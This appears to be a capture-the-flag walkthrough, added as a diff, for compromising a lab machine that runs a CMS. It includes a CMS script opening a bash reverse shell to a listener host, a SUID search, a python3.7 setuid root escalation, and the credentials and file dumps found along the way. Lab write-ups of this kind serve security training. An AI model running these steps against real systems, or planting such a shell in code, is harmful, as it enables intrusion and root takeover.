@@ -1,0 +1,156 @@
+Find interesting notes in http://192.168.1.205:8080/mynote.txt...
+user 		- admin
+password 	- adminadmin2 
+
+http://192.168.1.205/backend
+And login using credentials found
+
+In CMS add this script:
+function onstart(){
+              exec("/bin/bash -c 'bash -i > /dev/tcp/192.168.1.15/1235 0>&1'");
+}
+
+Start listener and wait for shell..
+
+
+hack@kali:~/CTF/ItsOctober$ nc -lvnp 1235
+Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::1235
+Ncat: Listening on 0.0.0.0:1235
+Ncat: Connection from 192.168.1.205.
+Ncat: Connection from 192.168.1.205:53434.
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+python -c "import pty;pty.spawn('/bin/bash')"
+
+ls
+README.md
+artisan
+bootstrap
+config
+index.php
+install.php
+install_files
+modules
+plugins
+server.php
+storage
+themes
+vendor
+python3 -c "import pty;pty.spawn('/bin/bash')"
+bash-5.0$ 
+
+
+bash-5.0$ cat /etc/passwd
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+armour:x:1000:1000:Armour Infosec,,,:/home/armour:/bin/bash
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
+mysql:x:106:113:MySQL Server,,,:/var/lib/mysql:/bin/false
+
+
+in /var/www/...../config/database.php found interesting credentials:
+    'connections' => [
+
+        'sqlite' => [
+            'driver'   => 'sqlite',
+            'database' => 'storage/database.sqlite',
+            'prefix'   => '',
+        ],
+
+        'mysql' => [
+            'driver'     => 'mysql',
+            'engine'     => 'InnoDB',
+            'host'       => 'localhost',
+            'port'       => '3306',
+            'database'   => 'octoberdb',
+            'username'   => 'root',
+            'password'   => 'root',
+            'charset'    => 'utf8mb4',
+            'collation'  => 'utf8mb4_unicode_ci',
+            'prefix'     => '',
+            'varcharmax' => 191,
+        ],
+
+        'pgsql' => [
+            'driver'   => 'pgsql',
+            'host'     => 'localhost',
+            'port'     => 5432,
+            'database' => 'database',
+            'username' => 'root',
+            'password' => '',
+            'charset'  => 'utf8',
+            'prefix'   => '',
+            'schema'   => 'public',
+        ],
+
+        'sqlsrv' => [
+            'driver'   => 'sqlsrv',
+            'host'     => 'localhost',
+            'port'     => 1433,
+            'database' => 'database',
+            'username' => 'root',
+            'password' => '',
+            'prefix'   => '',
+        ],
+
+    ],
+
+But not find anythings..
+
+bash-5.0$ find / -perm -u=s -type f 2>/dev/null
+find / -perm -u=s -type f 2>/dev/null
+/usr/bin/newgrp
+/usr/bin/su
+/usr/bin/python3.7m
+/usr/bin/passwd
+/usr/bin/chfn
+/usr/bin/chsh
+/usr/bin/mount
+/usr/bin/umount
+/usr/bin/python3.7
+/usr/bin/gpasswd
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+
+
+bash-5.0$ python3.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+python3.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+# id
+id
+uid=0(root) gid=33(www-data) groups=33(www-data)
+# cd /root
+cd /root
+# ls
+ls
+proof.txt
+# cat proof.txt
+cat proof.txt
+Best of Luck
+$2y$12$EUztpmoFH8LjEzUBVyNKw.9AKf37uZWPxJp.A3eop2ff0LbLYZrFq
+# 
+
